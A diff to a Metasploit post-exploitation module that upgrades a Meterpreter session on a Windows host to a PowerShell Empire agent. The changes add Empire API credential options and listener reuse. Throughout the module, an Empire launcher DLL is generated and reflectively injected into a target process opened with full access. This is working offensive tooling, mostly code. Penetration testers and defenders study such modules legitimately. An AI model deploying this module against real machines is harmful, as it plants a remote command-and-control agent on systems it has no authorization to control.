@@ -2,7 +2,8 @@
 # This module requires Metaspoit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
+require 'socket'
+require 'resolv-replace'
 require 'msf/core/post/windows/reflective_dll_injection'
 require 'msf/core/empire_lib'
 require 'msf/base/sessions/empire'
@@ -12,18 +13,18 @@ class MetasploitModule < Msf::Post
   def initialize(info={})
     super(update_info(info,
                       "Name"                => "Upgrading to Empire from Meterpreter Post Module",
-                      "Description"         => " This module will set up a bridge between the already existing meterpretr session and the Empire instance hosted over the port 1337. Please note that you need to have Empire Web-API preinstalled in your machine.",
+                      "Description"         => " This module will set up a bridge between the already existing meterpretr session and the Empire instance hosted over the port 1337. Please note that you need to have Empire Web-API preinstalled and running over the default port if you intend to use Empire from Metasploit",
                       "LICENSE"             => MSF_LICENSE,
                       "Platform"            => ["windows"],
                       "SessionTypes"        => ["meterpreter"],
-                      "Author"              => ["author"]
+                      "Author"              => ["zed009"]
                      ))
     register_options(
       [
-        OptAddress.new('LHOST',
-                       [false, 'Host to start the listener on']),
-        OptPort.new('LPORT',
-                    [false, 'Port for payload to connect to, make sure port is not already in use']),
+        OptString.new('USERNAME',
+                      [true, 'Username passed while initiating Empire-API']),
+        OptString.new('PASSWORD',
+                     [true, 'Password passed while initiating Empire-API']),
         OptString.new('PathToEmpire',
                       [true, 'The Complete Path to Empire-Web API']),
         OptInt.new('PID',
@@ -31,7 +32,15 @@ class MetasploitModule < Msf::Post
       ])
   end
   def run
+    #
+    #Check for running Empire Instance over port 1337
+    #
+    command = "netstat -nlt | grep 1337 >> /dev/null"
+    value = system(command)
+    raise "No Empire Instance Found. Please initiate the Empire API before launching MSF" if not value
+    #
     #recurrsive method to generate an open port number
+    #
     def gen_port()
       port_number = rand(2000..62000)
       command = "netstat -nlt | grep #{port_number}"
@@ -42,63 +51,60 @@ class MetasploitModule < Msf::Post
         return port_number
       end
     end
-    #Trying to get localhost from the framwork
-    if datastore['LHOST']
-      @host = datastore['LHOST']
-    elsif framework.datastore['LHOST']
+    #
+    #Trying to get localhost from the framework
+    #
+    if framework.datastore['LHOST']
       @host = framework.datastore['LHOST']
     else
-      @host = session.tunnel_local.split(':')[0]
-      if @host == 'Local Pipe'
-        print_error('LHOST is "Local Pipe", please manualy set the correct IP')
-        return
-      end
+      ip = Socket.ip_address_list.detect{|intf| intf.ipv4_private?}
+      @host = ip.ip_address
     end
-    #trying to allot open port
-    if datastore['LPORT']
-      @port = datastore['LPORT']
-    elsif
-      @port = gen_port().to_s
-    end
+    #
+    #Trying to allot open port
+    #
+    @port = gen_port()
+    #
     #Storing user inputs
+    #
     @path = datastore['PathToEmpire'].to_s.chomp
     @pid = datastore['PID'].to_i
-    @listener_name = 'Listener_Emp'
+    @empire_username = datastore['USERNAME']
+    @empire_password = datastore['PASSWORD']
+    #
+    #Assigning temporary listener name
+    #
+    @listener_name = "ListenerEmpire#{rand(200..600)}"
 
-    #Changing the working directory to the provided path
-    Dir.chdir(@path)
-
-    #method to initiate the web-API
-    def initiate_API
-      print_status("Initiating the Empire Web-API instance. Might take few moments")
-      command = "netstat -nlt | grep 1337"
-      value = system(command)
-      raise "Port 1337 already in use." if value
-      command = "./empire --headless --username 'empire-msf' --password 'empire-msf' > /dev/null"
-      value = system(command)
-    end
-
-    #main function
+    #
+    #Main function. This function handles all the interaction with the
+    #Empire-API. Any modification to the library shall lead to changes in this
+    #method.
+    #
     def main
-      #Setting up Empire
-      sleep(10)
 
       #Creating Empire Instance
       print_status("Creating Empire Instance")
-      client_emp = Msf::Empire::Client.new('empire-msf','empire-msf')
+      client_emp = Msf::Empire::Client.new(@empire_username, @empire_password)
       #Checking listener status
-      response = client_emp.is_listener_active(@listener_name)
-      if response == false
-        print_status(client_emp.create_listener(@listener_name, @port, @host))
+      if client_emp.get_a_listener != false
+        @listener_name = client_emp.get_a_listener
+        print_status("Listening with listener #{@listener_name}")
       else
-        print_status(response)
+        response = client_emp.is_listener_active(@listener_name)
+        if response == false
+          print_status(client_emp.create_listener(@listener_name, @port, @host))
+        else
+          print_status(response)
+        end
       end
 
       #Defining the payload path
       payload_path = '/tmp/launcher-emp.dll'
 
       #Creating Empire DLL
-      print_status(client_emp.generate_dll(@listener_name,payload_path,'x64',@path))
+      print_status("Generating reflectively injectable DLL")
+      client_emp.generate_dll(@listener_name,'x64',@path)
 
       #Injecting the created DLL payload reflectively in provided process
       host_process = client.sys.process.open(@pid, PROCESS_ALL_ACCESS)
@@ -126,16 +132,7 @@ class MetasploitModule < Msf::Post
 
     end
 
-    #Commencing threads
-    thread_api = Thread.new{
-      initiate_API()
-    }
-    thread_main = Thread.new{
-      main()
-    }
-
-    #Joining the main thread
-    thread_main.join
+    main()
 
   end
 end
